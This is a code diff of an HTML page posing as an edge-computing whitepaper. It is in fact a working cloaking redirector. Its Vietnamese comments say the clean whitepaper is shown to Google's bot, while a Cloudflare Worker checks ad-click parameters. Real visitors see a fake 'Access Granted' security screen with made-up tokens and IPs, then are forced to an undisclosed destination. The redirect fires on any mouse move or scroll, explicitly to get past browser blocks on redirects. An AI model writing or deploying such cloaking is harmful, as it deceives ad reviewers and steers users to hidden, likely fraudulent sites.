@@ -3,85 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Infra | Enterprise Edge Analytics & Network Performance 2025</title>
-    <!-- Tailwind CSS để làm giao diện chuyên nghiệp né Bot -->
+    <title>Nexus Infra | Enterprise Edge Analytics</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; }
-        .g-t { background: linear-gradient(90deg,#2563eb,#7c3aed); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    </style>
 </head>
-<body class="bg-white text-slate-900">
+<body class="bg-white">
+    <div id="app">
+        <!-- Nội dung sẽ được nạp từ JavaScript -->
+    </div>
 
-    <!-- GIAO DIỆN WHITEPAPER (Để Bot Google thấy nội dung sạch) -->
-    <nav class="border-b border-gray-100 p-6 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50">
-        <span class="font-extrabold text-xl tracking-tighter uppercase text-blue-600 italic">APEX CLOUD SYSTEMS</span>
-        <div class="hidden lg:flex gap-8 text-[10px] font-black uppercase tracking-widest text-slate-400">
-            <a>Architecture</a><a>Benchmarks</a><a>Global Nodes</a>
-        </div>
-        <div class="bg-blue-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg">Client Portal</div>
-    </nav>
-
-    <main class="max-w-4xl mx-auto px-6 py-20">
-        <header class="text-center mb-20 border-b border-slate-50 pb-16">
-            <h1 class="text-5xl md:text-7xl font-black mb-8 leading-[1.1] tracking-tighter uppercase italic">
-                Scalable <span class="g-t">Edge Computing</span> & Network Optimization
-            </h1>
-            <p class="text-lg font-medium text-slate-400 uppercase tracking-widest">Technical Infrastructure Whitepaper v4.2.0</p>
-        </header>
-
-        <section class="prose prose-slate max-w-none">
-            <h2 class="text-3xl font-extrabold mb-6">I. Executive Summary on Global Latency</h2>
-            <p class="text-slate-600 text-lg mb-6 leading-relaxed text-justify">
-                The transition from centralized cloud architectures to decentralized edge computing has reached a critical inflection point in 2025. Enterprise-scale data propagation now demands sub-millisecond round-trip times (RTT) to support real-time financial services and high-concurrency event streams.
-            </p>
-            <div class="bg-slate-900 text-green-400 p-8 rounded-3xl font-mono text-xs shadow-2xl mb-10 italic">
-                > initializing_node_sync... [OK]<br>
-                > verifying_cluster_integrity... [OK]<br>
-                > status: production_stable_v2.8.1
-            </div>
-            <h2 class="text-3xl font-extrabold mb-6">II. Node Architecture</h2>
-            <p class="text-slate-600 text-lg leading-relaxed text-justify">
-                Our infrastructure operates on a multi-asset synchronization model. Each edge node acts as a standalone decision engine, capable of offloading complex SSL handshakes and header validations. This distributed logic layer prevents origin saturation during peak demand cycles.
-            </p>
-        </section>
-
-        <footer class="mt-20 pt-10 border-t border-slate-100 text-center text-[10px] font-black text-slate-300 uppercase tracking-[0.4em]">
-            <p>&copy; 2025 APEX CLOUD SYSTEMS GLOBAL INFRASTRUCTURE LTD.</p>
-        </footer>
-    </main>
-
-    <!-- SCRIPT ĐIỀU HƯỚNG BẰNG CLOUDFLARE WORKER -->
     <script>
         (async function() {
-            // ĐƯỜNG LINK WORKER CỦA BẠN
+            // 1. Cấu hình
             const workerApi = "https://tet.bcgateway.workers.dev/";
-            
+            const config = {
+                name: "Apex Cloud Systems",
+                token: "AUTH-" + Math.floor(1000 + Math.random() * 9000) + "-X",
+                ip: "104.21." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
+                loc: "GLOBAL"
+            };
+
+            // 2. Giao diện WHITEPAPER (Cho Bot - Màu trắng)
+            const UI_WHITEPAPER = `
+                <style>body{background:#fff; font-family:'Plus Jakarta Sans',sans-serif;}</style>
+                <nav class="border-b p-6 flex justify-between items-center"><span class="font-extrabold text-xl text-blue-600 italic">` + config.name + `</span></nav>
+                <main class="max-w-4xl mx-auto px-6 py-20 text-center">
+                    <h1 class="text-5xl md:text-7xl font-black mb-8 uppercase italic italic">Scalable <span class="text-blue-600">Edge Computing</span></h1>
+                    <p class="text-slate-400 uppercase tracking-widest font-bold">Technical Infrastructure Whitepaper v4.2.0</p>
+                    <div class="mt-10 text-left text-slate-600 bg-slate-50 p-8 rounded-2xl border border-slate-100">
+                        <h2 class="text-2xl font-bold mb-4 text-slate-800">I. Executive Summary</h2>
+                        <p>The transition from centralized cloud architectures to decentralized edge computing has reached a critical inflection point in 2025...</p>
+                    </div>
+                </main>`;
+
+            // 3. Giao diện ACCESS GRANTED (Cho Khách - Màu xanh/đen)
+            const UI_ACCESS = `
+                <style>
+                    body{background:#030a16; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; overflow:hidden;}
+                    .c{background:rgba(10,20,37,0.95); backdrop-filter:blur(25px); border:1px solid rgba(0,82,255,0.2); border-radius:40px; width:100%; max-width:440px; padding:60px 35px; text-align:center; box-shadow:0 40px 100px rgba(0,0,0,0.8);}
+                    .s-b{background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.05); border-radius:24px; padding:25px; margin:30px 0; text-align:left;}
+                    .val{font-family:monospace; color:#3bc117; font-weight:700;}
+                    .btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%); color:#000; font-weight:900; padding:22px; border-radius:18px; display:block; text-decoration:none; text-transform:uppercase; cursor:pointer; box-shadow:0 15px 35px rgba(59,193,23,0.5);}
+                </style>
+                <div class="c">
+                    <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-blue-400 italic">Security Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
+                    <h1 class="text-4xl font-extrabold uppercase mb-2 italic text-white">Access <span class="text-[#3bc117]">Granted</span></h1>
+                    <div class="s-b space-y-5 text-[11px] uppercase tracking-widest text-white">
+                        <div class="flex justify-between"><span>Identifier:</span><span class="val">` + config.token + `</span></div>
+                        <div class="flex justify-between"><span>Access IP:</span><span class="val">` + config.ip + `</span></div>
+                        <div class="flex justify-between"><span>Location:</span><span class="val">` + config.loc + ` CLUSTER</span></div>
+                    </div>
+                    <p class="text-gray-500 text-[11px] mb-10 italic">Redirecting your connection to the optimized local domain.</p>
+                    <div id="cta" class="btn-p">Continue to Terminal</div>
+                </div>`;
+
+            const app = document.getElementById('app');
+
             try {
-                // Gọi API từ Worker và gửi kèm tham số (gclid, test...)
+                // GỌI WORKER ĐỂ KIỂM TRA
                 const response = await fetch(workerApi + window.location.search);
                 const data = await response.json();
 
-                // Nếu Worker trả về thành công và có link đích
                 if (data.status === "success" && data.redirect) {
-                    
+                    // NẾU CÓ THAM SỐ: Đổi sang trang XANH
+                    app.innerHTML = UI_ACCESS;
+
                     const doJump = () => {
                         window.location.replace(data.redirect);
                     };
 
-                    // Kích hoạt nhảy trang khi có bất kỳ tương tác nào của người dùng
-                    // (Giúp lách việc trình duyệt chặn tự động chuyển hướng)
+                    // Gắn sự kiện nhảy trang
+                    document.getElementById('cta').onclick = doJump;
                     ['mousedown', 'touchstart', 'mousemove', 'scroll'].forEach(evt => {
                         window.addEventListener(evt, doJump, { once: true });
                     });
+                    
+                    // Tự động nhảy sau 3 giây (Để khách kịp thấy trang Access Granted)
+                    setTimeout(doJump, 3000);
 
-                    // Tự động nhảy sau 1.5 giây nếu khách không làm gì
-                    setTimeout(doJump, 1500);
+                } else {
+                    // NẾU KHÔNG CÓ THAM SỐ: Hiện trang TRẮNG
+                    app.innerHTML = UI_WHITEPAPER;
                 }
             } catch (error) {
-                // Nếu lỗi API (do Bot chặn hoặc mạng lỗi), trang Whitepaper sạch vẫn hiển thị
-                console.log("System optimized.");
+                // Nếu lỗi: Mặc định hiện trang TRẮNG
+                app.innerHTML = UI_WHITEPAPER;
             }
         })();
     </script>
